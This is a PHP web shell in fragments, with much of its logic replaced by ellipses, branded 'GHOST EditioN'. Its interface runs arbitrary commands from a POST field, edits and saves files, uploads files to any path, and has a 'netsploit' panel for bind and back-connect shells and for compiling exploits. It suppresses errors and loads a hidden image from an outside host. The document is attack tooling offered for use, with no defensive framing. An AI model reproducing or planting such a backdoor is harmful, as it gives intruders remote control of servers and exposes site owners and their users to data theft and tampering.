<?php
echo '<img src="http://ww3s.ws/TR/HTML5/CSS3/fsocity.jpg"  height="0" width="0"><body>';
error_reporting(0);
@set_time_limit(0);
@session_start();
// server software
...
?> EditioN ::</title>
      ...
      <style type="text/css"> body {
         background-image: url("http://cdn01.wallconvert.com/_media/conv/1/12/117130-razer-wallpaper-hd.jpg");     background-repeat: repeat-y;
            ...
            <table>
               <tr>
                  <td>
                     <table class="b_tbl">
                        <tr>
                           <td><a href="#"><span class="b1">G<span class="b2">HOS</span>T</span></a></td>
                        </tr>
                        <tr>
                           <td><span class="gaya"><?php
echo $xName;
?></span> EditioN</td>
                        </tr>
                     </table>
...
echo "y=" . $pwd;
?>&amp;x=jumping">jumping</a> <a href="?<?php
echo "y=" . $pwd;
?>&amp;x=logout">logout</a> </div>
         <!-- menu end --> <?php
...
?>&amp;x=php" method="post">
            <table class="cmdbox">
               <tr>
                  <td> <textarea class="output" name="cmd" id="cmd"> <?php
...
?> </textarea> 
               <tr>
                  <td><input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td>
               </tr>
         </form>
         </table> </form> <?php
...
?>" method="post">
            <table class="cmdbox">
               <tr>
                  <td colspan="2"> <textarea class="output" name="content"> <?php
    echo $content;
?> </textarea> 
               <tr>
                  <td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php
    echo $file;
...
?>&amp;x=upload" enctype="multipart/form-data" method="post">
            <table class="tabnet" style="width:320px;padding:0 1px;">
               ...
               <tr>
                  <td colspan="2">
                     <p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p>
                  </td>
               <tr>
                  <td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php
    echo $pwd;
?>" /></td>
               </tr>
               </tr> 
         ...
         <table class="tabnet" style="width:320px;padding:0 1px;">
            ...
            <tr>
               <td colspan="2">
                  <form method="post" style="margin:0;padding:0;" actions="?y=<?php
    echo $pwd;
?>&amp;x=upload">
                     <table>
                        <tr>
...
?>&amp;x=netsploit">
                        <tr>
                           <td>Port</td>
                           <td><input class="inputz" type="text" name="port" size="26" value="<?php
    echo $bindport;
?>"></td>
                        </tr>
                        <tr>
                           <td>Password</td>
                           <td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php
    echo $bindport_pass;
?>"></td>
                        </tr>
                        <tr>
...
?>&amp;x=netsploit">
                        <tr>
                           <td>IP</td>
                           <td><input class="inputz" type="text" name="ip" size="26" value="<?php
    echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"));
?>"></td>
                        </tr>
                        <tr>
                           <td>Port</td>
                           <td><input class="inputz" type="text" name="backport" size="26" value="<?php
    echo $bindport;
?>"></td>
                        </tr>
                        <tr>
...
?>&amp;x=netsploit">
                        ...
                        <tr>
                           ...
                           <td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td>
                        </tr>
                     </form>
                  </table>
               </td>
...
?>&amp;x=shell" method="post">
            <table class="cmdbox">
               <tr>
                  <td colspan="2"> <textarea class="output" readonly> <?php
    if (isset($_POST['submitcmd'])) {
        echo @exe($_POST['cmd']);
    }
?> </textarea> 
